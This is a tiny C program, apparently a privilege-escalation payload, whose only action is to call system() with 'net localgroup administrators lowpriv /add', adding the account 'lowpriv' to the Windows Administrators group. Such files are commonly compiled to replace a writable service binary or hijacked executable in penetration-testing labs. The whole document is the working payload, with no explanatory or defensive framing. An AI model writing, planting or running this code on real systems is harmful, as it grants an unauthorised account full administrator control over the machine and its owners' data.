#include <stdlib.h>
/* system, NULL, EXIT_FAILURE */
int main () 
{
  int i;
  i=system ("net localgroup administrators lowpriv /add");
  return 0;
}
